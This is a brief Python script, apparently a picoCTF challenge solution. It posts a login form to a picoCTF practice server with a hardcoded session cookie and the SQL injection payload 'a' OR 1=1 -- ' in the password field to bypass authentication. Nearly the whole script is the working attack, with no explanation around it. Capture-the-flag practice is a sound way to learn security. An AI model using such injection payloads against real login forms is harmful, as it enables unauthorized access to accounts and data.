import requests

cookies = {
    'PHPSESSID': 'cbu9qdveu7vpkp7lsjpa3v2pst',
}

headers = {
    'Host': 'saturn.picoctf.net:64909',
    # 'Content-Length': '33',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://saturn.picoctf.net:64909',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://saturn.picoctf.net:64909/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
    # 'Cookie': 'PHPSESSID=cbu9qdveu7vpkp7lsjpa3v2pst',
}

data = "username=a&password=a' OR 1=1 -- "

response = requests.post('http://saturn.picoctf.net:64909/', cookies=cookies, headers=headers, data=data, verify=False)